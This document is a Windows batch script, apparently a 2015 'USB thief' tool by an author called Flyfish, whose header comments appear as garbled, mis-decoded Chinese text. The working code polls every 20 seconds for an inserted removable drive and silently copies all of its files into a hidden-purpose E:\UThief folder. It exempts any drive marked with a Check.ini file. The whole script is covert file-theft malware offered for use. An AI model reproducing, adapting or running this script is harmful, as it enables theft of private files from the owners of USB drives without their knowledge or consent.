@ECHO ON
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::    FUT U��С͵  Code by Flyfish  2015-09-13  Author:Flyfish
::
::  ���ܣ�1����ȡ�κβ�������Ե�USB����
::
::        2���ܹ��Զ����U���Ƿ���룬ÿ20����һ��
::
::        3��Ĭ�Ͻ���ȡ���ļ�������E��UThiefĿ¼�£�������ʽ��������ʱ��
::
::        4���ܹ��趨�������U�̣��ܱ�����U�̽���ִ�п�������()
::
::        5����ʱ��֧�ֵ����豸����(����ͬʱ����2������USB���̿��ܻ���Bug)
::
::        6��������־����
::
::  ������ʷ��
::
::  2015.09.13  FUT v1.0���ع����룬��������ܱ���U�̹���
::
::  2014.07.19  USBС͵ ��ʵ�ֻ�������
::

:AGAIN
DEL /F /Q "%TEMP%\FUT1.TMP"
DEL /F /Q "%TEMP%\FUT2.TMP"
FOR %%I IN (C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) DO @FSUTIL FSINFO DRIVETYPE %%I: >>"%TEMP%\FUT1.TMP"
FINDSTR "���ƶ�������" "%TEMP%\FUT1.TMP" >"%TEMP%\FUT2.TMP"
IF ERRORLEVEL==1 CALL :Sleep 20

FOR /F "TOKENS=1" %%I IN ('FINDSTR /I "���ƶ�������" "%TEMP%\FUT2.TMP"') DO SET UDrive=%%I
DIR %UDrive%\Check.ini
IF ERRORLEVEL==1 GOTO GOON
IF ERRORLEVEL==0 CALL :Sleep 20

:GOON
ECHO D|XCOPY /R /G /E /C /Y  %UDrive%\*.* E:\UThief\%DATE:~0,4%%DATE:~5,2%%DATE:~8,2%%TIME:~0,2%%TIME:~3,2%
GOTO AGAIN

:Sleep
REM ��δ��⵽U�̣�ping��ʱ20s�������⣡
REM ping����ռ���ڴ�2044KB��
ping 127.0.0.1 -n %1 > NUL
GOTO AGAIN